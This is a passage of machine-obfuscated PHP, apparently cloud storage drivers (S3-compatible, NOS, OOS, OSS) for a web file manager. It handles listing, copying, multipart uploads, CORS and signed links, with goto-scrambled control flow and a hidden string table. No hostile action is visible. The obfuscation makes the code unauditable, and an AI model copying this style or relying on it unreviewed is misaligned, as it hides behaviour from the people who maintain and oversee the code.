mk_dir(DATA_THUMB); } goto E; b: if (!($B׊ = IO::move($Fɵ, $F))) { return IO::fileOut($Fɵ); } del_file($Fɵ); IO::fileOut($B׊); goto dڧ؟; a: if ($A[$A݋[78]] <= 1024 * 50 || !function_exists($A݋[156]) || $A[$A݋[157]] == $A݋[158]) { return $this->fileOut($e); } if (isset($A[$A݋[159]][$A݋[160]])) { $bա = $A[$A݋[159]][$A݋[160]]; } else { if (isset($A[$A݋[159]][$A݋[161]])) { $bա = $A[$A݋[159]][$A݋[161]]; } else { $bա = md5("{$A[$A݋[28]]}\137{$A[$A݋[76]]}\x5f{$A[$A݋[78]]}"); } } $E̊ = "{$bա}\x5f{$F}\x2e\160\156\147"; goto AЯ졗; dڧ؟: } public function fileOutImageServer($d獮, $eݧ̦ = 250) { $this->fileOutImage($d獮, $eݧ̦); } public function fileNameAuto($dצ, $a×ѥ, $dږӅ = REPEAT_RENAME, $f輌 = false) { goto DϽ; DԦ: $Fҵό = 1; $E텊 = substr($a×ѥ, 0, strlen($a×ѥ) - strlen($D۽)); $f̕ = $E텊 . "\x28{$Fҵό}\x29{$D۽}"; goto A; A: while ($this->exist(rtrim($dצ, $Eج[8]) . $Eج[8] . $f̕)) { $f̕ = $E텊 . "\50{$Fҵό}\51{$D۽}"; $Fҵό++; } return $f̕; goto aЃ; C: if ($dږӅ == REPEAT_SKIP) { return !1; } $D۽ = $Eج[92] . get_path_ext($a×ѥ); $D۽ = $D۽ == $Eج[92] || $f輌 ? $Eج[33] : $D۽; goto DԦ; DϽ: $Eج =& $_SERVER[놫Ӱ]; $Dĩش = $dצ === $Eج[33] ? $a×ѥ : rtrim($dצ, $Eج[8]) . $Eج[8] . $a×ѥ; if ($dږӅ == REPEAT_REPLACE || !$this->exist($Dĩش) || $f輌 && $dږӅ != REPEAT_RENAME_FOLDER) { return $a×ѥ; } goto C; aЃ: } public function listAllFiles($b積, $b臜, $aͦ = array()) { goto B׏; E݈: $b積 = trim($b積, $a蟎熕[8]); foreach ($b臜 as $Dձ) { $Fښꎪ = ltrim(substr($Dձ, strlen($b積)), $a蟎熕[8]); $eǙ = array_merge($eǙ, $this->slicePath($Fښꎪ)); } $c = array(); goto F; B׏: $a蟎熕 =& $_SERVER[놫Ӱ]; if (empty($b臜)) { return array(); } $eǙ = array(); goto E݈; F: foreach (array_unique($eǙ) as $Dձ) { $bۡ⤿ = array($a蟎熕[76] => $this->getPathOuter($a蟎熕[8] . $b積 . $a蟎熕[8] . $Dձ), $a蟎熕[77] => 1, $a蟎熕[78] => 0); if (substr($Dձ, -1) != $a蟎熕[8]) { $bۡ⤿[$a蟎熕[77]] = 0; $C = $this->getPath($b積 . $a蟎熕[8] . $Dձ); $bۡ⤿[$a蟎熕[78]] = isset($aͦ[$C]) ? $aͦ[$C] : $this->size($C); } $c[] = $bۡ⤿; } return $c; goto cҞ; cҞ: } public function slicePath($D𭜅) { $e튒 =& $_SERVER[놫Ӱ]; $A῕ = explode($e튒[8], trim($D𭜅, $e튒[8])); $d㈠ʮ = 0; do { ++$d㈠ʮ; $d[] = implode($e튒[8], array_slice($A῕, 0, $d㈠ʮ)) . $e튒[8]; } while ($d㈠ʮ < count($A῕)); $d[count($A῕) - 1] = $D𭜅; return $d; } public function getHost() { $BϞ =& $_SERVER[놫Ӱ]; $Dͻ = parse_url(trim($this->domain, $BϞ[8])); $D彭ܼ = isset($Dͻ[$BϞ[165]]) ? $Dͻ[$BϞ[165]] : http_type(); $C = isset($Dͻ[$BϞ[166]]) ? $Dͻ[$BϞ[166]] : $Dͻ[$BϞ[76]]; if (isset($Dͻ[$BϞ[167]])) { $C .= $BϞ[4] . $Dͻ[$BϞ[167]]; } return $D彭ܼ . $BϞ[168] . $C; } public function pathEncode($bܼҊ) { $cő =& $_SERVER[놫Ӱ]; return str_replace($cő[169], $cő[8], rawurlencode($bܼҊ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public function __construct($Aˢ) { set_timeout(); require_once SDK_DIR . $_SERVER[놫Ӱ][170]; parent::__construct(); $this->_init($Aˢ); } public function _init($Aɏ) { foreach ($Aɏ as $Dުخ => $BɄ) { if (isset($this->{$Dުخ})) { $this->{$Dުخ} = $BɄ; } } $this->endpoint = $Aɏ[$_SERVER[놫Ӱ][171]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($a = "\x76\x34") { $this->signVer = $a; $this->client->setSignatureVersion($a); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto Cԅ; D: if ($C[$A̍ئ[172]] != $A̍ئ[173] || $C[$A̍ئ[174]] != $A̍ئ[173]) { return !1; } $Fؠν = array_map($A̍ئ[175], $C[$A̍ئ[176]]); if (!is_array($Fؠν)) { $Fؠν = array(); } goto Fʔ; Fʔ: $cώ = array($A̍ئ[177], $A̍ئ[178], $A̍ئ[179], $A̍ئ[180], $A̍ئ[181]); $C˘֙ = array_diff($cώ, $Fؠν); return empty($C˘֙); goto b; Cԅ: $A̍ئ =& $_SERVER[놫Ӱ]; $C = $this->getBucketCors(); if (!$C || !is_array($C)) { return !1; } goto D; b: } public function mkfile($a, $e悜 = '', $A՚ϫ = REPEAT_RENAME) { $fڙ = $this->setContent($a, $e悜); if ($fڙ !== !1) { return $this->getPathOuter($a); } return !1; } public function mkdir($eޚ, $Aͧަ = REPEAT_SKIP) { if (empty($eޚ)) { return !1; } if ($this->_isFolder($eޚ)) { return $this->getPathOuter($eޚ); } $E蕏 = $this->setContent($eޚ, $_SERVER[놫Ӱ][33], !0); if ($E蕏 !== !1) { return $this->getPathOuter($eޚ); } return !1; } public function copyFile($E, $C࿾, $cÿȻ = array()) { $Dߍ =& $_SERVER[놫Ӱ]; $B¨ = $this->objectMeta($E); if (!$B¨) { return !1; } if ($B¨[$Dߍ[78]] <= 1024 * 1024 * 200) { $Dʟ = $this->client->copyObject($this->bucket, $E, $this->bucket, $C࿾, $Dߍ[182], $cÿȻ); } else { $Dʟ = $this->client->multiCopyObject($this->bucket, $E, $this->bucket, $C࿾, $cÿȻ); } $Dʟ = $Dʟ ? $this->getPathOuter($C࿾) : !1; return $Dʟ; } public function moveFile($f, $E󈆈) { if ($this->copyFile($f, $E󈆈)) { $this->delFile($f); return $this->getPathOuter($E󈆈); } return !1; } public function delFile($aϦϗ) { return $this->client->deleteObject($this->bucket, $aϦϗ); } public function delFolder($dʧ) { goto FΓ; eǠ: return $CĲ === $d ? !0 : !1; goto f흌; FΓ: $c؂ =& $_SERVER[놫Ӱ]; $c؝Υ篮 = $this->listObjs($dʧ); if (!$c؝Υ篮) { $dʧ = trim($dʧ, $c؂[8]); if (!empty($dʧ)) { $dʧ .= $c؂[8]; } return $this->delFile($dʧ); } goto f؍; f؍: $CĲ = $d = 0; $Aꪡ = array_chunk(array_keys($c؝Υ篮), 1000); foreach ($Aꪡ as $cԄ) { $CĲ++; $d += (int) $this->client->deleteObjects($this->bucket, $cԄ); } goto eǠ; f흌: } public function rename($F͖ͦ, $AЇ) { return $this->renameObject($F͖ͦ, $AЇ); } public function listPath($D־ɐ, $B䲷 = false) { $aɂ =& $_SERVER[놫Ӱ]; $dش = $this->listObjs($D־ɐ, null, null, $aɂ[8]); $Bȧ = array($aɂ[75] => array(), $aɂ[74] => array()); foreach ($dش as $A։ => $F͓) { if ($A։ == $aɂ[8]) { continue; } if (isset($F͓[$aɂ[183]])) { $Bȧ[$aɂ[75]][] = $this->folderInfo($F͓[$aɂ[183]], $B䲷); } else { if (substr($F͓[$aɂ[28]], -1) == $aɂ[8]) { continue; } $Bȧ[$aɂ[74]][] = $this->fileInfo($F͓[$aɂ[28]], $B䲷, $F͓); } } return $Bȧ; } private function fileInfo($C, $Eڠ = false, $d = array()) { goto FѬ͛; dߥ: if (empty($d)) { $d = $this->objectMeta($C); if (!$d) { return $c̳; } } if (isset($d[$b򡱐[187]])) { $c̳[$b򡱐[106]] = $d[$b򡱐[187]]; } if (isset($d[$b򡱐[78]])) { $c̳[$b򡱐[78]] = $d[$b򡱐[78]]; } goto fג; fג: return $c̳; goto eߜ܄; FѬ͛: $b򡱐 =& $_SERVER[놫Ӱ]; if ($Eڠ) { return array($b򡱐[28] => $this->pathThis($C), $b򡱐[76] => $this->getPathOuter($C), $b򡱐[29] => $b򡱐[164], $b򡱐[157] => $this->ext($C), $b򡱐[78] => isset($d[$b򡱐[78]]) ? $d[$b򡱐[78]] : 0, $b򡱐[184] => $b򡱐[50], $b򡱐[106] => $b򡱐[50], $b򡱐[185] => !0, $b򡱐[186] => !0); } $c̳ = array($b򡱐[28] => $this->pathThis($C), $b򡱐[76] => $this->getPathOuter($C), $b򡱐[29] => $b򡱐[164], $b򡱐[184] => $b򡱐[50], $b򡱐[106] => $b򡱐[50], $b򡱐[78] => 0, $b򡱐[157] => $this->ext($C), $b򡱐[185] => !0, $b򡱐[186] => !0); goto dߥ; eߜ܄: } private function folderInfo($c, $fڑ򻕉 = false) { goto a՘; A: if (!$e) { return $d; } if (isset($fپ[$B[187]])) { $d[$B[184]] = $fپ[$B[187]]; } return $d; goto b; a՘: $B =& $_SERVER[놫Ӱ]; if ($fڑ򻕉) { return array($B[28] => $this->pathThis($c), $B[76] => $this->getPathOuter($B[8] . $c), $B[29] => $B[77], $B[185] => !0, $B[186] => !0); } $d = array($B[28] => $this->pathThis($c), $B[76] => $this->getPathOuter($B[8] . $c), $B[29] => $B[77], $B[184] => $B[50], $B[106] => $B[50], $B[185] => !0, $B[186] => !0); goto cʯ; cʯ: if ($c == $B[33]) { return $d; } $c = trim($c, $B[8]) . $B[8]; $e = $this->objectMeta($c); goto A; b: } public function listObjs($A蕊, $b튒 = null, $c = null, $d© = null) { $EΏ =& $_SERVER[놫Ӱ]; $A蕊 = trim($A蕊, $EΏ[8]); $f߯ = empty($A蕊) ? $EΏ[33] : $A蕊 . $EΏ[8]; return $this->client->getBucket($this->bucket, $f߯, $b튒, $c, $d©, !0); } public function has($aٽ, $B = false, $EЉڔ = true) { goto Eʱ; dҷě: if ($B) { return array($aɼۢ[188] => $D, $aɼۢ[189] => $aهݡ); } return !1; goto BՎ; Eʱ: $aɼۢ =& $_SERVER[놫Ӱ]; $D = 0; $aهݡ = 0; goto Eᗡ; Eᗡ: $CɯΏ = $this->listObjs($aٽ, null, null, $aɼۢ[8]); $CɯΏ = is_array($CɯΏ) ? $CɯΏ : array(); foreach ($CɯΏ as $Fǫ) { if (isset($Fǫ[$aɼۢ[28]]) && substr($Fǫ[$aɼۢ[28]], -1) != $aɼۢ[8]) { if (!$B && $EЉڔ) { return !0; } $D++; } else { if (isset($Fǫ[$aɼۢ[183]])) { if (!$B && !$EЉڔ) { return !1; } $aهݡ++; } } } goto dҷě; BՎ: } public function listAll($f) { $c럙 =& $_SERVER[놫Ӱ]; $A퉡 = $this->listObjs($f); $aǯ = $EƂ = array(); foreach ($A퉡 as $Bʭ => $CŲ뎌) { $aǯ[] = $CŲ뎌[$c럙[28]]; $EƂ[$Bʭ] = $CŲ뎌[$c럙[78]]; } return $this->listAllFiles($f, $aǯ, $EƂ); } public function canRead($fɎ) { $cŒ =& $_SERVER[놫Ӱ]; $cէ = $this->client->getAccessControlPolicy($this->bucket, $fɎ); if (!$cէ) { return !1; } return in_array($cէ, array($cŒ[190], $cŒ[191], $cŒ[192])) ? !0 : !1; } public function canWrite($e) { $B =& $_SERVER[놫Ӱ]; $bյе = $this->client->getAccessControlPolicy($this->bucket, $e); if (!$bյе) { return !1; } return in_array($bյе, array($B[190], $B[191])) ? !0 : !1; } public function getContent($B) { return $this->client->getObject($this->bucket, $B); } public function setContent($Dȉ҇, $A𨨴 = '', $f쌞Ă = false) { goto c҇ӌ; a: $b = $this->client->putObject($A𨨴, $this->bucket, $Dȉ҇, $dý[182], array(), $d诠); if (!$b) { return !1; } if ($f쌞Ă) { return !0; } goto EƏ; EƏ: $b = $this->copyFile($Dȉ҇, $Dȉ҇, array($dý[193] => $b[$dý[194]])); return $b ? !0 : !1; goto a; c҇ӌ: $dý =& $_SERVER[놫Ӱ]; $Dȉ҇ = $f쌞Ă ? trim($Dȉ҇, $dý[8]) . $dý[8] : $Dȉ҇; $d诠 = get_file_mime(get_path_ext($Dȉ҇)); goto a; a: } public function fileSubstr($Aߑɍ, $DƐ, $b߬) { $Cʊ = $DƐ + $b߬ - 1; return $this->client->getObject($this->bucket, $Aߑɍ, array($_SERVER[놫Ӱ][195] => "\x62\x79\x74\145\x73\75{$DƐ}\55{$Cʊ}")); } public function upload($f͌, $f˴, $ađ = false, $Fí = REPEAT_REPLACE) { $EЌӟ =& $_SERVER[놫Ӱ]; $eߋȂ = array($EЌӟ[193] => @md5_file($f˴)); $CɆ = array($EЌӟ[196] => get_file_mime(get_path_ext($f͌))); if (IO::size($f˴) <= 1024 * 1024 * 200) { $eڭ = $this->client->putObjectFile($f˴, $this->bucket, $f͌, $EЌӟ[182], $eߋȂ, $CɆ); return !empty($eڭ) ? $this->getPathOuter($f͌) : !1; } $f؄ = $this->client->multiUploadObject($f˴, $this->bucket, trim($f͌, $EЌӟ[8]), $eߋȂ, $CɆ); return $f؄ ? $this->getPathOuter($f͌) : !1; } public function download($bב, $a) { if (!@is_dir($this->pathFather($a)) && !IO::mkdir($this->pathFather($a))) { return !1; } $aヸη = $this->client->getObject($this->bucket, $bב, array(), $a); return $aヸη !== !1 ? $a : !1; } public function link($e你, $E整 = array()) { $c悳 =& $_SERVER[놫Ӱ]; if ($this->signVer == $c悳[197]) { return $this->client->getAuthenticatedURL($this->bucket, $e你, 3600 * 12, $E整); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($e你, $c悳[8]), 3600 * 12, $this->region, array(), !0, $E整); } public function fileOut($AŪ, $c˜賮 = false, $a߆ = false, $bß = '') { goto cӋ; cӋ: $CҼ =& $_SERVER[놫Ӱ]; if (!$a߆) { $a߆ = $this->pathThis($AŪ); } $aʋ = get_file_mime(get_path_ext($a߆)); goto B; c: $E󄧹 = $this->link($AŪ, $AѬՒ); $this->fileOutLink($E󄧹); goto d˧抡; B: if ($aʋ == $CҼ[198]) { return parent::fileOut($AŪ, $c˜賮, $a߆, $bß); } $c˜賮 = $c˜賮 ? $CҼ[199] : $CҼ[200]; $AѬՒ = array($CҼ[201] => $c˜賮 . $CҼ[202] . rawurlencode($a߆), $CҼ[203] => $aʋ); goto c; d˧抡: } public function fileOutServer($E, $Eԓ = false, $Dͳ՛ = false, $e = '') { parent::fileOut($E, $Eԓ, $Dͳ՛, $e); } public function fileOutImage($E, $D̗ = 250) { $D┻ = $this->link($E); $this->fileOutLink($D┻); } public function fileOutImageServer($C¯, $Eʹئ = 250) { parent::fileOutImage($C¯, $Eʹئ); } public function hashMd5($cҷ̉, $f = '') { $D˰͆ =& $_SERVER[놫Ӱ]; $f󮦍 = $this->objectMeta($cҷ̉); if (!$f󮦍) { return !1; } $f = $f ? $f : _get($f󮦍, $D˰͆[204]); $f = $f ? $f : _get($f󮦍, $D˰͆[194], $D˰͆[33]); return $f; } public function uploadFormData($Dއإ, $d = 3600) { $c =& $_SERVER[놫Ӱ]; $Fɨݓ = $this->pathFather($Dއإ); $d = $this->client->getHttpUploadPostParams($this->bucket, $Fɨݓ, $c[182], $d); return array_merge((array) $d, array($c[166] => $this->getHost())); } public function multiUploadFormData($Cֈ, $F䚿 = 3600) { $cኲ =& $_SERVER[놫Ӱ]; $a = gmdate($cኲ[205]); $DӔ = array(); $b⑿ = $this->client->getUploadId($this->bucket, $Cֈ, $DӔ); if (!$b⑿) { return !1; } return array($cኲ[206] => $b⑿, $cኲ[166] => $this->getHost() . $cኲ[8] . $this->pathEncode($Cֈ), $cኲ[207] => $a, $cኲ[88] => $Cֈ); } public function multiUploadAuthData($DӇ, $bȄ = array()) { goto d뷶; c: $dل = isset($bȄ[$C[157]]) ? $bȄ[$C[157]] : $C[33]; $dȤɫ = $bȄ[$C[88]]; unset($bȄ[$C[88]]); goto b; b: $FɃ = $C[216] . $this->accessKey . $C[4] . $Dت; if (strpos($dل, $C[210]) === 0) { return array($C[217] => $FɃ, $C[207] => $b߽); } return $FɃ; goto bṎ; D: if (isset($bȄ[$C[212]]) && $bȄ[$C[212]] == $C[213]) { $b[0] = $C[213]; } $D = implode($C[214], $b); $Dت = base64_encode(hash_hmac($C[215], $D, $this->secret, !0)); goto b; b: if (isset($bȄ[$C[208]])) { return $this->listUploadParts($dȤɫ, $bȄ); } $b = array($C[209], $C[33], $C[115], $C[33], "\170\55\141\x6d\x7a\55\144\x61\164\x65\72{$b߽}", $C[8] . $this->bucket . $C[8] . $this->pathEncode($dȤɫ) . $dل); if (strpos($dل, $C[210]) === 0) { $b[0] = $C[211]; } goto D; d뷶: $C =& $_SERVER[놫Ӱ]; $b߽ = isset($bȄ[$C[207]]) ? $bȄ[$C[207]] : gmdate($C[205]); $bȄ[$C[207]] = $b߽; goto c; bṎ: } public function listUploadParts($d, $c³ = array()) { goto BʭМ; e斵: $D˷ؐ = $this->multiUploadAuthData($d, $c³); if (empty($D˷ؐ)) { return !1; } return array($e繑[217] => $D˷ؐ, $e繑[207] => $c³[$e繑[207]], $e繑[219] => $B̭); goto a֮ޘț; BʭМ: $e繑 =& $_SERVER[놫Ӱ]; $Cɉڈ = str_replace($e繑[218], $e繑[33], $c³[$e繑[157]]); $B̭ = $this->client->listParts($this->bucket, $d, $Cɉڈ); goto d; d: if (!$B̭) { return !1; } unset($c³[$e繑[208]], $c³[$e繑[212]]); $c³[$e繑[88]] = $d; goto e斵; a֮ޘț: } public function getHost() { return parent::getHost() . $_SERVER[놫Ӱ][8] . $this->bucket; } public function size($e) { $A਩ = $this->objectMeta($e); return $A਩ ? $A਩[$_SERVER[놫Ӱ][78]] : 0; } public function info($D۶) { if ($this->isFolder($D۶)) { return $this->folderInfo($D۶); } else { if ($this->isFile($D۶)) { return $this->fileInfo($D۶); } } return !1; } public function exist($Bڎ) { return $this->isFile($Bڎ) || $this->isFolder($Bڎ); } public function isFile($AŃ) { return !$this->isFolder($AŃ) && $this->objectMeta($AŃ); } public function isFolder($D) { return $this->cacheMehod($_SERVER[놫Ӱ][220], $D); } protected function objectMeta($c͆܈) { return $this->cacheMehod($_SERVER[놫Ӱ][221], $c͆܈); } protected function _objectMeta($c) { $a̗ =& $_SERVER[놫Ӱ]; try { $f숉 = $this->client->getObjectInfo($this->bucket, $c); if (!isset($f숉[$a̗[204]]) && isset($f숉[$a̗[222]])) { $f숉[$a̗[204]] = $f숉[$a̗[222]]; } } catch (OSS\Core\OssException $cً܂ɶ) { $f숉 = !1; } return $f숉; } protected function _isFolder($F쌺) { return !empty($this->listObjs($F쌺, null, 1)) ? !0 : !1; } } define($_SERVER[놫Ӱ][223], 1); goto E; C͏: class PathDriverNOS extends PathDriverBaseS3 { public function __construct($Bʉ) { parent::__construct($Bʉ); $this->client->setSignatureVersion($_SERVER[놫Ӱ][197]); } public function setBucketCors() { return !1; } public function getBucketCors() { return !1; } public function isBucketCors() { return !0; } public function setContent($fⶸ̏, $fá = '', $bŻ燘 = false) { $cɻ =& $_SERVER[놫Ӱ]; $fⶸ̏ = $bŻ燘 ? trim($fⶸ̏, $cɻ[8]) . $cɻ[8] : $fⶸ̏; $C = get_file_mime(get_path_ext($fⶸ̏)); $f = $this->client->putObject($fá, $this->bucket, $fⶸ̏, $cɻ[182], array(), $C); return $f ? !0 : !1; } public function upload($cх, $cɤ۠, $E׾ = false, $a뗏 = REPEAT_REPLACE) { $FѪ =& $_SERVER[놫Ӱ]; $bŔ = array(); $a☮ = array($FѪ[196] => get_file_mime(get_path_ext($cх))); if (IO::size($cɤ۠) <= 1024 * 1024 * 200) { $eԿ = $this->client->putObjectFile($cɤ۠, $this->bucket, $cх, $FѪ[182], $bŔ, $a☮); return !empty($eԿ) ? !0 : !1; } $d = $this->client->multiUploadObject($cɤ۠, $this->bucket, trim($cх, $FѪ[8]), $bŔ, $a☮); return $d ? $this->getPathOuter($cх) : !1; } public function blockChain($fɧ笉, $D) { $bԻ =& $_SERVER[놫Ӱ]; $BŶҪ = $this->objectMeta($fɧ笉); if (!$BŶҪ) { return !1; } return $this->client->copyObject($this->bucket, $fɧ笉, $this->bucket, $fɧ笉, $bԻ[182], array(), $D, $bԻ[1126], !0); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($C՜) { parent::__construct($C՜); $this->signatureVersion($_SERVER[놫Ӱ][197]); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public function __construct($cذ) { parent::__construct(); include_once SDK_DIR . $_SERVER[놫Ӱ][1127]; $this->_init($cذ); } public function _init($A) { foreach ($A as $b => $d⍄ܘ݂) { if (isset($this->{$b})) { $this->{$b} = $d⍄ܘ݂; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[놫Ӱ][1128], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); } public function setBucketCors() { goto B; b츗: $Aѱ->setMaxAgeSeconds(600); $Aѱ->addExposeHeader($e[1134]); $Aѱ->addAllowedHeader($e[1129]); goto Cͩ; Cͩ: $A->addRule($Aѱ); try { $this->client->putBucketCors($this->bucket, $A); } catch (OSS\Core\OssException $fńԄ) { return !1; } return !0; goto eާ; B: $e =& $_SERVER[놫Ӱ]; $A = new OSS\Model\CorsConfig(); $Aѱ = new OSS\Model\CorsRule(); goto f̛; f̛: $Aѱ->addAllowedOrigin($e[1129]); $Aѱ->addAllowedMethod($e[1130]); $Aѱ->addAllowedMethod($e[1131]); goto d̉; d̉: $Aѱ->addAllowedMethod($e[1132]); $Aѱ->addAllowedMethod($e[1133]); $Aѱ->addAllowedMethod($e[150]); goto b츗; eާ: } public function getBucketCors() { goto C; e: if (!$dڗ || !($dЙ = $dڗ->getRules())) { return null; } $Bօ = $dЙ[0]->getAllowedOrigins(); $D = $dЙ[0]->getAllowedMethods(); goto C˙; dƺꦉ: return array($Aѻ[172] => isset($Bօ[0]) ? $Bօ[0] : $Aѻ[33], $Aѻ[176] => $D, $Aѻ[1135] => $cЎ, $Aѻ[1136] => isset($eޱ٬[0]) ? $eޱ٬[0] : $Aѻ[33], $Aѻ[174] => isset($EѽҌ[0]) ? $EѽҌ[0] : $Aѻ[33]); goto A߫; C: $Aѻ =& $_SERVER[놫Ӱ]; $dڗ = null; try { $dڗ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $F׭) { return null; } goto e; C˙: $cЎ = $dЙ[0]->getMaxAgeSeconds(); $eޱ٬ = $dЙ[0]->getExposeHeaders(); $EѽҌ = $dЙ[0]->getAllowedHeaders(); goto dƺꦉ; A߫: } public function isBucketCors() { goto eŚ; cԋ: if ($EԧĻ[$c߰[172]] != $c߰[173] || $EԧĻ[$c߰[174]] != $c߰[173]) { return !1; } $b塽 = array_map($c߰[175], $EԧĻ[$c߰[176]]); if (!is_array($b塽)) { $b塽 = array(); } goto Bȕ; eŚ: $c߰ =& $_SERVER[놫Ӱ]; $EԧĻ = $this->getBucketCors(); if (!$EԧĻ || !is_array($EԧĻ)) { return !1; } goto cԋ; Bȕ: $E = array($c߰[177], $c߰[178], $c߰[179], $c߰[180], $c߰[181]); $Bʫ = array_diff($E, $b塽); return empty($Bʫ); goto b; b: } public function mkfile($cЏ, $f뭄 = '', $E맾 = REPEAT_RENAME) { $bҲ = $this->setContent($cЏ, $f뭄); if ($bҲ !== !1) { return $this->getPathOuter($cЏ); } return !1; } public function mkdir($Aޕ, $Bն = REPEAT_SKIP) { if ($this->_isFolder($Aޕ)) { return $this->getPathOuter($Aޕ); } try { $this->client->createObjectDir($this->bucket, $Aޕ); } catch (OSS\Core\OssException $f) { return !1; } return $this->getPathOuter($Aޕ); } private function fileList($a, $A = '', $c穱 = 0) { goto DÍ҅; D: $a滿 = $Aˍ[33]; $B = 1000; $e򳂱䩩 = $e߃ = array(); goto b򚕘; b򚕘: while (!0) { $a₅ɯ = array($Aˍ[1137] => $A, $Aˍ[183] => $F, $Aˍ[1138] => $B, $Aˍ[1139] => $a滿); try { $fƮ = $this->client->listObjects($this->bucket, $a₅ɯ); } catch (OSS\Core\OssException $F֖) { break; } $a滿 = $fƮ->getNextMarker(); $eҗ = $fƮ->getObjectList(); $aߺ = $fƮ->getPrefixList(); foreach ($eҗ as $F׶) { if ($F׶->getKey() == $F) { continue; } $f謸 = $F׶->getKey(); if ($c穱) { $f謸 = array($Aˍ[28] => $f謸, $Aˍ[78] => $F׶->getSize(), $Aˍ[187] => strtotime($F׶->getLastModified())); } $e߃[] = $f謸; } foreach ($aߺ as $d˰Ќ) { $e򳂱䩩[] = $d˰Ќ->getPrefix(); } if ($a滿 === $Aˍ[33]) { break; } } return array($Aˍ[75] => $e򳂱䩩, $Aˍ[74] => $e߃); goto D҅; DÍ҅: $Aˍ =& $_SERVER[놫Ӱ]; $a = trim($a, $Aˍ[8]); $F = empty($a) ? $Aˍ[33] : $a . $Aˍ[8]; goto D; D҅: } public function copyFile($A蕇, $dɖܗ) { $fלÓ = $this->size($A蕇); if ($fלÓ < 1024 * 1024 * 1024) { try { $d刉 = $this->client->copyObject($this->bucket, $A蕇, $this->bucket, $dɖܗ); } catch (OSS\Core\OssException $Fјٱ) { return !1; } return !0; } return $this->multiCopyObject($A蕇, $dɖܗ, $fלÓ); } private function multiCopyObject($E迋ω, $fŖ, $Bԭł) { $a =& $_SERVER[놫Ӱ]; try { goto e; b۾: $Bͅ = $this->osChunkSize(); $F = $this->client->generateMultiuploadParts($Bԭł, $Bͅ); foreach ($F as $D => $C쌒) { $F⬤ = $C + (int) $C쌒[$a[1141]]; $EǼ숗 = (int) $C쌒[$a[322]] + $F⬤ - 1; $F = array($a[1142] => $F⬤, $a[1143] => $EǼ숗); $D[] = $this->client->uploadPartCopy($this->bucket, $E迋ω, $this->bucket, $fŖ, $Bꘕ, $c߸, $F); $Bꘕ = $Bꘕ + 1; } goto e; e: $bɸը = array(); if ($bލˉ = $this->hashMd5($E迋ω)) { $bɸը = array(OSS\OssClient::OSS_HEADERS => array($a[1140] => $bލˉ)); } $c߸ = $this->client->initiateMultipartUpload($this->bucket, $fŖ, $bɸը); goto E蓪; E蓪: $Bꘕ = 1; $C = 0; $D = array(); goto b۾; e: $A̪깹 = array(); foreach ($D as $D => $E֌) { $A̪깹[] = array($a[1144] => $D + 1, $a[1145] => $E֌); } $E = $this->client->completeMultipartUpload($this->bucket, $fŖ, $c߸, $A̪깹); goto d; d: } catch (OSS\Core\OssException $AɆ؂) { return !1; } return !0; } public function moveFile($eН, $eԠ) { if ($this->copyFile($eН, $eԠ)) { $this->remove($eН); return !0; } return !1; } public function delFile($F) { try { $this->client->deleteObject($this->bucket, $F); } catch (OSS\Core\OssException $a) { return !1; } return !0; } public function delFolder($F) { $b =& $_SERVER[놫Ӱ]; $e = $this->fileList($F); if (!empty($F) && !in_array(trim($F, $b[8]) . $b[8], $e[$b[74]])) { $e[$b[74]][] = trim($F, $b[8]) . $b[8]; } foreach (array_chunk($e[$b[74]], 1000) as $B׋) { try { $this->client->deleteObjects($this->bucket, $B׋); } catch (OSS\Core\OssException $b؄ϐ) { continue; } } return !0; } public function rename($dڏӈ, $F) { return $this->renameObject($dڏӈ, $F); } private function fileInfo($D, $a = array()) { goto Eמ; b: return $f; goto aˈ; eڎ: if (isset($a[$d[78]])) { $f[$d[78]] = $a[$d[78]]; } if (isset($a[$d[106]])) { $f[$d[106]] = $a[$d[106]]; } if (isset($a[$d[187]]) && !trim($f[$d[106]])) { $f[$d[106]] = $a[$d[187]]; } goto b; Eמ: $d =& $_SERVER[놫Ӱ]; $f = array($d[28] => $this->pathThis($D), $d[76] => $this->getPathOuter($D), $d[29] => $d[164], $d[184] => $d[50], $d[106] => $d[50], $d[78] => 0, $d[157] => $this->ext($D), $d[185] => !0, $d[186] => !0); if (empty($a)) { $C = $this->objectMeta($D); if (!$C) { return $f; } $a = array($d[106] => strtotime($C[$d[1146]]), $d[78] => $C[$d[1147]] + 0); } goto eڎ; aˈ: } private function folderInfo($eڶ, $AВ = array()) { $b =& $_SERVER[놫Ӱ]; $Bמ = array($b[28] => $this->pathThis($eڶ), $b[76] => $this->getPathOuter($b[8] . $eڶ), $b[29] => $b[77], $b[184] => $b[50], $b[106] => $b[50], $b[185] => !0, $b[186] => !0); if (empty($AВ)) { $eڶ = rtrim($eڶ, $b[8]) . $b[8]; $F = $this->objectMeta($eڶ); if (!$F) { return $Bמ; } $AВ = array($b[184] => $F[$b[1148]][$b[1149]], $b[106] => strtotime($F[$b[1146]])); } if (isset($AВ[$b[106]])) { $Bמ[$b[106]] = $AВ[$b[106]]; } if (isset($AВ[$b[184]])) { $Bמ[$b[184]] = $AВ[$b[184]]; } return $Bמ; } public function listPath($c͔, $D = false) { $BǱ =& $_SERVER[놫Ӱ]; $FΉͣ = $this->fileList($c͔, $BǱ[8], !0); foreach ($FΉͣ[$BǱ[75]] as $d => $Fᕆ) { $FΉͣ[$BǱ[75]][$d] = $this->folderInfo($Fᕆ, $Fᕆ); } foreach ($FΉͣ[$BǱ[74]] as $d => $Fᕆ) { $FΉͣ[$BǱ[74]][$d] = $this->fileInfo($Fᕆ[$BǱ[28]], $Fᕆ); } return $FΉͣ; } public function has($fǤ퐗, $Eς̫ = false, 